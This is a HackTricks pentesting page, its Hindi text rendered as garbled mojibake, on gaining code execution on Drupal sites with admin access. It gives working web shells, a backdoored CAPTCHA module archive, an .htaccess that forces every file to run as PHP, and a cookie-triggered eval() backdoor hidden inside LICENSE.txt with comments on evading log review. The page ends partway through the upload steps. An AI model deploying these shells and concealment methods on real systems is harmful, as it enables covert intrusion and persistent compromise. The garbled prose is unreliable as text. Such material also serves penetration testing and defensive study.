# Drupal RCE

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдЕрдЧрд░ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рд╣реЛ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕ рджреЗрдЦреЗрдВ**](https://github.com/sponsors/carlospolop)!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/hacktricks\_live)** рдкрд░ **рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВред

</details>

## PHP рдлрд╝рд┐рд▓реНрдЯрд░ рдореЙрдбреНрдпреВрд▓ рдХреЗ рд╕рд╛рде

{% hint style="warning" %}
рдкреБрд░рд╛рдиреЗ рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рдореЗрдВ Drupal **(рд╕рдВрд╕реНрдХрд░рдг 8 рд╕реЗ рдкрд╣рд▓реЗ)** рдореЗрдВ, рдПрдбрдорд┐рди рдХреЗ рд░реВрдк рдореЗрдВ рд▓реЙрдЧ рдЗрди рдХрд░рдирд╛ рд╕рдВрднрд╡ рдерд╛ рдФрд░ **`PHP рдлрд╝рд┐рд▓реНрдЯрд░` рдореЙрдбреНрдпреВрд▓ рдХреЛ рд╕рдХреНрд╖рдо рдХрд░рдирд╛** рдерд╛, рдЬреЛ "рдПрдореНрдмреЗрдбреЗрдб PHP рдХреЛрдб/рд╕реНрдирд┐рдкреЗрдЯ рдХреЛ рдореВрд▓реНрдпрд╛рдВрдХрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред" рд▓реЗрдХрд┐рди рд╕рдВрд╕реНрдХрд░рдг 8 рд╕реЗ рдпрд╣ рдореЙрдбреНрдпреВрд▓ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рд╕реНрдерд╛рдкрд┐рдд рдирд╣реАрдВ рд╣реИред
{% endhint %}

рдЖрдкрдХреЛ **рдкреНрд▓рдЧрдЗрди php рдХреЛ рд╕реНрдерд╛рдкрд┐рдд рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП** (рдЗрд╕реЗ рдЬрд╛рдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП _/modules/php_ рддрдХ рдкрд╣реБрдВрдЪреЗрдВ рдФрд░ рдпрджрд┐ рдпрд╣ рдПрдХ **403** рд▓реМрдЯрд╛рддрд╛ рд╣реИ рддреЛ, **рдореМрдЬреВрдж рд╣реИ**, рдЕрдЧрд░ **рдирд╣реАрдВ рдорд┐рд▓рд╛**, рддреЛ **рдкреНрд▓рдЧрдЗрди php рд╕реНрдерд╛рдкрд┐рдд рдирд╣реАрдВ рд╣реИ**)

_рдореЙрдбреНрдпреВрд▓_ рдкрд░ рдЬрд╛рдПрдВ -> (**рдЬрд╛рдВрдЪреЗрдВ**) _PHP рдлрд╝рд┐рд▓реНрдЯрд░_ -> _рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рд╕рд╣реЗрдЬреЗрдВ_

![](<../../../.gitbook/assets/image (247) (1).png>)

рдлрд┐рд░ _Add content_ рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ -> _Basic Page_ рдпрд╛ _Article -_> рд╢рд░реАрд░ рдкрд░ _php рд╢реИрд▓рдХреЛрдб рд▓рд┐рдЦреЗрдВ_ -> _PHP рдХреЛрдб_ рдХрд╛ рдЪрдпрди рдХрд░реЗрдВ _Text format_ рдореЗрдВ -> _рдкреВрд░реНрд╡рд╛рд╡рд▓реЛрдХрди рдХрд╛ рдЪрдпрди рдХрд░реЗрдВ_

![](<../../../.gitbook/assets/image (338).png>)

рдЕрдВрдд рдореЗрдВ, рдмрд╕ рдирдП рдиреЛрдб рддрдХ рдкрд╣реБрдВрдЪреЗрдВ:
```bash
curl http://drupal-site.local/node/3
```
## PHP Filter Module рдЗрдВрд╕реНрдЯреЙрд▓ рдХрд░реЗрдВ

{% hint style="warning" %}
рд╡рд░реНрддрдорд╛рди рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рдореЗрдВ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдЗрдВрд╕реНрдЯреЙрд▓реЗрд╢рди рдХреЗ рдмрд╛рдж рдХреЗрд╡рд▓ рд╡реЗрдм рддрдХ рдкрд╣реБрдВрдЪрдХрд░ рдкреНрд▓рдЧрдЗрдиреНрд╕ рдХреЛ рдЗрдВрд╕реНрдЯреЙрд▓ рдХрд░рдирд╛ рдЕрдм рд╕рдВрднрд╡ рдирд╣реАрдВ рд╣реИред
{% endhint %}

**8 рдХреЗ рд╕рдВрд╕реНрдХрд░рдг рд╕реЗ**, [**PHP Filter**](https://www.drupal.org/project/php/releases/8.x-1.1) **рдореЙрдбреНрдпреВрд▓ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдЗрдВрд╕реНрдЯреЙрд▓ рдирд╣реАрдВ рд╣реЛрддрд╛ рд╣реИ**ред рдЗрд╕ рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рд▓рд╛рдн рдЙрдард╛рдиреЗ рдХреЗ рд▓рд┐рдП, рд╣рдореЗрдВ **рдореЙрдбреНрдпреВрд▓ рдЦреБрдж рд╣реА рдЗрдВрд╕реНрдЯреЙрд▓ рдХрд░рдирд╛ рд╣реЛрдЧрд╛**ред

1. Drupal рд╡реЗрдмрд╕рд╛рдЗрдЯ рд╕реЗ рдореЙрдбреНрдпреВрд▓ рдХрд╛ рд╕рдмрд╕реЗ рд╣рд╛рд▓ рдХрд╛ рд╕рдВрд╕реНрдХрд░рдг рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВред
2. wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
3. рдбрд╛рдЙрдирд▓реЛрдб рд╣реЛрдиреЗ рдХреЗ рдмрд╛рдж **`рдкреНрд░рд╢рд╛рд╕рди`** > **`рд░рд┐рдкреЛрд░реНрдЯреНрд╕`** > **`рдЙрдкрд▓рдмреНрдз рдЕрдкрдбреЗрдЯреНрд╕`** рдкрд░ рдЬрд╛рдПрдВред
4. **`рдмреНрд░рд╛рдЙрдЬрд╝ рдХрд░реЗрдВ`** рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ, рдлрд╝рд╛рдЗрд▓ рдХреЛ рдЪреБрдиреЗрдВ рдЬрд┐рд╕реЗ рд╣рдордиреЗ рдЗрд╕реЗ рдбрд╛рдЙрдирд▓реЛрдб рдХрд┐рдпрд╛ рдерд╛, рдФрд░ рдлрд┐рд░ **`рдЗрдВрд╕реНрдЯреЙрд▓`** рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВред
5. рдореЙрдбреНрдпреВрд▓ рдЗрдВрд╕реНрдЯреЙрд▓ рд╣реЛрдиреЗ рдХреЗ рдмрд╛рдж, рд╣рдо **`рд╕рд╛рдордЧреНрд░реА`** рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ **рдирдпрд╛ рдмреЗрд╕рд┐рдХ рдкреЗрдЬ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ**, рдЬреИрд╕рд╛ рдХрд┐ рд╣рдордиреЗ Drupal 7 рдЙрджрд╛рд╣рд░рдг рдореЗрдВ рдХрд┐рдпрд╛ рдерд╛ред рдлрд┐рд░ рд╕реЗ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░реЗрдВ рдХрд┐ **`рдкрд╛рда рд╕реНрд╡рд░реВрдк` рдбреНрд░реЙрдкрдбрд╛рдЙрди рд╕реЗ `PHP рдХреЛрдб` рдХрд╛ рдЪрдпрди** рдХрд░реЗрдВред

## Backdoored рдореЙрдбреНрдпреВрд▓

{% hint style="warning" %}
рд╡рд░реНрддрдорд╛рди рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рдореЗрдВ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдЗрдВрд╕реНрдЯреЙрд▓реЗрд╢рди рдХреЗ рдмрд╛рдж рдХреЗрд╡рд▓ рд╡реЗрдм рддрдХ рдкрд╣реБрдВрдЪрдХрд░ рдкреНрд▓рдЧрдЗрдиреНрд╕ рдХреЛ рдЗрдВрд╕реНрдЯреЙрд▓ рдХрд░рдирд╛ рдЕрдм рд╕рдВрднрд╡ рдирд╣реАрдВ рд╣реИред
{% endhint %}

рдПрдХ backdoored рдореЙрдбреНрдпреВрд▓ **рдореМрдЬреВрджрд╛ рдореЙрдбреНрдпреВрд▓ рдореЗрдВ рдПрдХ рд╢реИрд▓ рдЬреЛрдбрд╝рдХрд░ рдмрдирд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ**ред рдореЙрдбреНрдпреВрд▓ drupal.org рд╡реЗрдмрд╕рд╛рдЗрдЯ рдкрд░ рдорд┐рд▓ рд╕рдХрддреЗ рд╣реИрдВред рдЪрд▓рд┐рдП рдПрдХ рдореЙрдбреНрдпреВрд▓ рдЪреБрдирддреЗ рд╣реИрдВ рдЬреИрд╕реЗ рдХрд┐ [CAPTCHA](https://www.drupal.org/project/captcha)ред рдиреАрдЪреЗ рд╕реНрдХреНрд░реЙрд▓ рдХрд░реЗрдВ рдФрд░ tar.gz [рдЖрд░реНрдХрд╛рдЗрд╡](https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz) рдХреЗ рд▓рд┐рдП рд▓рд┐рдВрдХ рдХреЙрдкреА рдХрд░реЗрдВред

* рдЖрд░реНрдХрд╛рдЗрд╡ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ рдФрд░ рдЙрд╕рдХреА рд╕рд╛рдордЧреНрд░реА рдирд┐рдХрд╛рд▓реЗрдВред
```
wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
tar xvf captcha-8.x-1.2.tar.gz
```
* рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕рд╛рдордЧреНрд░реА рдХреЗ рд╕рд╛рде рдПрдХ **PHP рд╡реЗрдм рд╢реИрд▓** рдмрдирд╛рдПрдВ:
```php
<?php
system($_GET["cmd"]);
?>
```
* рдЕрдЧрд▓реЗ, рд╣рдореЗрдВ рдлрд╝реЛрд▓реНрдбрд░ рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдХрд╛ рдЕрдзрд┐рдХрд╛рд░ рджреЗрдиреЗ рдХреЗ рд▓рд┐рдП **`.htaccess`** рдлрд╝рд╛рдЗрд▓ рдмрдирд╛рдиреА рд╣реЛрдЧреАред рдпрд╣ рдЬрд░реБрд░реА рд╣реИ рдХреНрдпреЛрдВрдХрд┐ Drupal **`/modules`** рдлрд╝реЛрд▓реНрдбрд░ рдХрд╛ рд╕реАрдзрд╛ рдЙрдкрдпреЛрдЧ рдЗрдирдХрд╛рд░ рдХрд░рддрд╛ рд╣реИред
```html
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```
* рдКрдкрд░ рдХрд╛ рд╡рд┐рдиреНрдпрд╛рд╕ рдиреАрдЪреЗ рджрд┐рдП рдЧрдП рдирд┐рдпрдореЛрдВ рдХреЛ рд▓рд╛рдЧреВ рдХрд░реЗрдЧрд╛ рдЬрдм рд╣рдо /modules рдореЗрдВ рдПрдХ рдлрд╝рд╛рдЗрд▓ рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд░реЗрдВред рдЗрди рджреЛрдиреЛрдВ рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ captcha рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ рдХреЙрдкреА рдХрд░реЗрдВ рдФрд░ рдПрдХ рдЖрд░реНрдХрд╛рдЗрд╡ рдмрдирд╛рдПрдВред
```bash
mv shell.php .htaccess captcha
tar cvf captcha.tar.gz captcha/
```
* рдорд╛рди рд▓реЗрдВ рдХрд┐ рд╣рдореЗрдВ рд╡реЗрдмрд╕рд╛рдЗрдЯ рдкрд░ **рдкреНрд░рд╢рд╛рд╕рдирд┐рдХ рдкрд╣реБрдВрдЪ** рд╣реИ, **`рдкреНрд░рдмрдВрдзрд┐рдд`** рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ рдФрд░ рд╕рд╛рдЗрдбрдмрд╛рд░ рдкрд░ **`рд╡рд┐рд╕реНрддрд╛рд░`** рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВред рдЕрдЧрд▓реЗ, **`+ рдирдпрд╛ рдореЙрдбреНрдпреВрд▓ рд╕реНрдерд╛рдкрд┐рдд рдХрд░реЗрдВ`** рдмрдЯрди рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ, рдФрд░ рд╣рдореЗрдВ рд╕реНрдерд╛рдкрд┐рдд рдкреГрд╖реНрда рдкрд░ рд▓реЗ рдЬрд╛рдпрд╛ рдЬрд╛рдПрдЧрд╛, рдЬреИрд╕реЗ `http://drupal-site.local/admin/modules/install`ред рдмреИрдХрдбреЛрд░реНрдб рдХреИрдкреНрдЪрд╛ рд╕рдВрдЧреНрд░рд╣ рдХреЛ рдмреНрд░рд╛рдЙрдЬрд╝ рдХрд░реЗрдВ рдФрд░ **`рд╕реНрдерд╛рдкрд┐рдд`** рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВред
* рд╕реНрдерд╛рдкрдирд╛ рд╕рдлрд▓ рд╣реЛрдиреЗ рдХреЗ рдмрд╛рдж, рдХрдорд╛рдВрдбреНрд╕ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **`/modules/captcha/shell.php`** рдкрд░ рдмреНрд░рд╛рдЙрдЬрд╝ рдХрд░реЗрдВред

## рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рд╕рдордХреНрд░рдордг рдХреЗ рд╕рд╛рде рдбреНрд░реБрдкрд▓ рдХреЛ рдмреИрдХрдбреЛрд░ рдХрд░рдирд╛ <a href="#backdooring-drupal" id="backdooring-drupal"></a>

**рдХреЛрдИрдлрд░0x90** рджреНрд╡рд╛рд░рд╛ рд╕рд╛рдЭрд╛ рдХрд┐рдпрд╛ рдЧрдпрд╛ [**Coiffeur0x90**](https://twitter.com/Coiffeur0x90)

### рднрд╛рдЧ 1 (_рдореАрдбрд┐рдпрд╛_ рдФрд░ _рдореАрдбрд┐рдпрд╛ рд▓рд╛рдЗрдмреНрд░реЗрд░реА_ рдХреА рд╕рдХреНрд░рд┐рдпрдг)

_рд╡рд┐рд╕реНрддрд╛рд░_ рдореЗрдиреВ (/admin/modules) рдореЗрдВ, рдЖрдк рдЙрд╕реЗ рд╕рдХреНрд░рд┐рдп рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рдкрд╣рд▓реЗ рд╕реЗ рд╕реНрдерд╛рдкрд┐рдд рдкреНрд▓рдЧрдЗрди рд▓рдЧрддреЗ рд╣реИрдВред рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ, рдкреНрд▓рдЧрдЗрди _рдореАрдбрд┐рдпрд╛_ рдФрд░ _рдореАрдбрд┐рдпрд╛ рд▓рд╛рдЗрдмреНрд░реЗрд░реА_ рд╕рдХреНрд░рд┐рдп рдирд╣реАрдВ рд▓рдЧрддреЗ рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП рд╣рдо рдЙрдиреНрд╣реЗрдВ рд╕рдХреНрд░рд┐рдп рдХрд░реЗрдВред

рд╕рдХреНрд░рд┐рдп рдХрд░рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ:

<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

рд╕рдХреНрд░рд┐рдп рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж:

<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

### рднрд╛рдЧ 2 (_рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рд╕рдордХреНрд░рдордг_ рд╕реБрд╡рд┐рдзрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛) <a href="#part-2-leveraging-feature-configuration-synchronization" id="part-2-leveraging-feature-configuration-synchronization"></a>

рд╣рдо _рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рд╕рдордХреНрд░рдордг_ рд╕реБрд╡рд┐рдзрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВрдЧреЗ рддрд╛рдХрд┐ рдбреНрд░реБрдкрд▓ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдПрдВрдЯреНрд░реАрдЬ рдХреЛ рдбрдВрдк (рдирд┐рд░реНрдпрд╛рдд) рдФрд░ рдЕрдкрд▓реЛрдб (рдЖрдпрд╛рдд) рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ:

* /admin/config/development/configuration/single/export
* /admin/config/development/configuration/single/import

**рдкреИрдЪ рд╕рд┐рд╕реНрдЯрдо рдлрд╝рд╛рдЗрд▓.yml**

рдЖрдЗрдЯрдо `allow_insecure_uploads` рдХреЛ рдкреИрдЪ рдХрд░рдиреЗ рд╕реЗ рд╢реБрд░реВ рдХрд░реЗрдВ:
```

...

allow_insecure_uploads: false

...

```
<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

рддрдХрдиреАрдХреА рд╡рд┐рд╡рд░рдг: system.file.yml
```

...

allow_insecure_uploads: true

...

```
<figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

**рдкреИрдЪ рдлрд╝реАрд▓реНрдб.рдлрд╝реАрд▓реНрдб.рдореАрдбрд┐рдпрд╛.рдбреЙрдХреНрдпреВрдореЗрдВрдЯ.рдлрд╝реАрд▓реНрдб_рдореАрдбрд┐рдпрд╛_рдбреЙрдХреНрдпреВрдореЗрдВрдЯ.yml**

рдлрд┐рд░, рджреВрд╕рд░реЗ рдПрдВрдЯреНрд░реА `file_extensions` рдХреЛ рдкреИрдЪ рдХрд░реЗрдВ:

рдлрд╝рд╛рдЗрд▓: рдлрд╝реАрд▓реНрдб.рдлрд╝реАрд▓реНрдб.рдореАрдбрд┐рдпрд╛.рдбреЙрдХреНрдпреВрдореЗрдВрдЯ.рдлрд╝реАрд▓реНрдб_рдореАрдбрд┐рдпрд╛_рдбреЙрдХреНрдпреВрдореЗрдВрдЯ.yml
```

...

file_directory: '[date:custom:Y]-[date:custom:m]'
file_extensions: 'txt rtf doc docx ppt pptx xls xlsx pdf odf odg odp ods odt fodt fods fodp fodg key numbers pages'

...
```
<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

рд╕реЗ:

рдлрд╝рд╛рдЗрд▓: field.field.media.document.field\_media\_document.yml
```
...

file_directory: '[date:custom:Y]-[date:custom:m]'
file_extensions: 'htaccess txt rtf doc docx ppt pptx xls xlsx pdf odf odg odp ods odt fodt fods fodp fodg key numbers pages'

...

```
> рдЗрд╕ рдмреНрд▓реЙрдЧ рдкреЛрд╕реНрдЯ рдореЗрдВ рдореИрдВ рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдирд╣реАрдВ рдХрд░рддрд╛, рд▓реЗрдХрд┐рди рдпрд╣ рдиреЛрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдХрд┐ `file_directory` рдкреНрд░рд╡рд┐рд╖реНрдЯрд┐ рдХреЛ рдХрд┐рд╕реА рднреА рддрд░реАрдХреЗ рд╕реЗ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдпрд╣ рдПрдХ рдкрде рднреНрд░рдордг рд╣рдорд▓реЗ рдХреЗ рд▓рд┐рдП рднреЗрджреНрдп рд╣реИ (рддрд╛рдХрд┐ рд╣рдо рдбреНрд░реБрдкрд▓ рдлрд╝рд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рдкреЗрдбрд╝ рдореЗрдВ рд╡рд╛рдкрд╕ рдЬрд╛ рд╕рдХреЗрдВ)ред

<figure><img src="../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

### рднрд╛рдЧ 3 (рд╕реБрд╡рд┐рдзрд╛ _рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдЬреЛрдбрд╝рдирд╛_ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛) <a href="#part-3-leveraging-feature-add-document" id="part-3-leveraging-feature-add-document"></a>

рдЖрдЦрд┐рд░реА рдХрджрдо рд╕рдмрд╕реЗ рд╕рд░рд▓ рд╣реИ, рдФрд░ рджреЛ рдЙрдк-рдХрджрдореЛрдВ рдореЗрдВ рд╡рд┐рднрд╛рдЬрд┐рдд рд╣реИред рдкрд╣рд▓рд╛ рдпрд╣ рд╣реИ рдХрд┐ .htaccess рдкреНрд░рд╛рд░реВрдк рдореЗрдВ рдПрдХ рдлрд╝рд╛рдЗрд▓ рдЕрдкрд▓реЛрдб рдХрд░рдирд╛ рдЬрд┐рд╕реЗ рдПрдкрд╛рдЪ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛рдПрдБ рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рдФрд░ .txt рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ PHP рдЗрдВрдЬрди рджреНрд╡рд╛рд░рд╛ рд╡реНрдпрд╛рдЦреНрдпрд╛ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рджреВрд╕рд░рд╛ рд╣реИ рд╣рдорд╛рд░реЗ рдкреЗрд▓реЛрдб рдХреЛ рд╢рд╛рдорд┐рд▓ рдХрд░рдиреЗ рд╡рд╛рд▓реА .txt рдлрд╝рд╛рдЗрд▓ рдЕрдкрд▓реЛрдб рдХрд░рдирд╛ред

рдлрд╝рд╛рдЗрд▓: .htaccess
```
<Files *>
SetHandler application/x-httpd-php
</Files>

# Vroum! Vroum!
# We reactivate PHP engines for all versions in order to be targetless.
<IfModule mod_php.c>
php_flag engine on
</IfModule>
<IfModule mod_php7.c>
php_flag engine on
</IfModule>
<IfModule mod_php5.c>
php_flag engine on
</IfModule>
```
рдХреНрдпреЛрдВ рдпрд╣ рдЯреНрд░рд┐рдХ рд╢рд╛рдирджрд╛рд░ рд╣реИ?

рдХреНрдпреЛрдВрдХрд┐ рдПрдХ рдмрд╛рд░ рдЬрдм рд╡реЗрдмрд╢реЗрд▓ (рдЬрд┐рд╕реЗ рд╣рдо LICENSE.txt рдХрд╣реЗрдВрдЧреЗ) рд╡реЗрдм рд╕рд░реНрд╡рд░ рдкрд░ рдбреНрд░реЙрдк рд╣реЛ рдЬрд╛рддрд╛ рд╣реИ, рд╣рдо `$_COOKIE` рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╣рдорд╛рд░реЗ рдХрдорд╛рдВрдб рдЯреНрд░рд╛рдВрд╕рдорд┐рдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рд╡реЗрдм рд╕рд░реНрд╡рд░ рд▓реЙрдЧ рдореЗрдВ, рдпрд╣ рдПрдХ рд╡реИрдз GET рдЕрдиреБрд░реЛрдз рдХреЗ рд░реВрдк рдореЗрдВ рдПрдХ рдкрд╛рда рдлрд╝рд╛рдЗрд▓ рдХреЗ рд▓рд┐рдП рдкреНрд░рджрд░реНрд╢рд┐рдд рд╣реЛрдЧрд╛ред

рд╣рдорд╛рд░реЗ рд╡реЗрдмрд╢реЗрд▓ рдХреЛ LICENSE.txt рдХреНрдпреЛрдВ рдирд╛рдо рджреЗрдВ?

рд╕рд┐рд░реНрдл рдЗрд╕рд▓рд┐рдП рдХреНрдпреЛрдВрдХрд┐ рдЕрдЧрд░ рд╣рдо рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдлрд╝рд╛рдЗрд▓ рдХреЛ рд▓реЗрдВ, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП [core/LICENSE.txt](https://github.com/drupal/drupal/blob/11.x/core/LICENSE.txt) (рдЬреЛ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рдбреНрд░реБрдкрд▓ рдХреЛрд░ рдореЗрдВ рдореМрдЬреВрдж рд╣реИ), рддреЛ рд╣рдореЗрдВ 339 рд▓рд╛рдЗрдиреЛрдВ рдФрд░ 17.6 KB рдХрд╛ рдЖрдХрд╛рд░ рд╡рд╛рд▓реА рдПрдХ рдлрд╝рд╛рдЗрд▓ рдорд┐рд▓рддреА рд╣реИ, рдЬрд┐рд╕рдореЗрдВ PHP рдХреЛрдб рдХрд╛ рдЫреЛрдЯрд╛ рд╕рд╛ рдЯреБрдХрдбрд╝рд╛ рдЬреЛрдбрд╝рдиреЗ рдХреЗ рд▓рд┐рдП рдкреВрд░реА рддрд░рд╣ рд╕реЗ рдЙрдкрдпреБрдХреНрдд рд╣реИ (рдХреНрдпреЛрдВрдХрд┐ рдлрд╝рд╛рдЗрд▓ рдкрд░реНрдпрд╛рдкреНрдд рдмрдбрд╝реА рд╣реИ)ред

<figure><img src="../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

рдлрд╝рд╛рдЗрд▓: Patched LICENSE.txt
```txt

...

this License, you may choose any version ever published by the Free Software
Foundation.

<?php

# We inject our payload into the cookies so that in the logs of the compromised
# server it shows up as having been requested via the GET method, in order to
# avoid raising suspicions.
if (isset($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"])) {
if (!empty($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"])) {
eval($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"]);
} else {
phpinfo();
}
}

?>

10. If you wish to incorporate parts of the Program into other free
programs whose distribution conditions are different, write to the author

...

```
#### **рднрд╛рдЧ 3.1 (рдлрд╝рд╛рдЗрд▓ .htaccess рдЕрдкрд▓реЛрдб рдХрд░реЗрдВ)**

рд╕рдмрд╕реЗ рдкрд╣рд▓реЗ, рд╣рдо _Add Document_ (/media/add/document) рд╡рд┐рд╢реЗрд╖рддрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╣рдорд╛рд░реА рдлрд╝рд╛рдЗрд▓ рдЕрдкрд▓реЛрдб рдХрд░рддреЗ рд╣реИрдВ рдЬрд┐рд╕рдореЗрдВ рдПрдкрд╛рдЪреЗ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛рдПрдБ рд╣реЛрддреА рд╣реИрдВ (.htaccess).

<figure><img src="../../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

**рднрд╛рдЧ 3.2 (рдлрд╝рд╛рдЗрд▓ LICENSE.txt рдЕрдкрд▓реЛрдб рдХрд░реЗрдВ)**

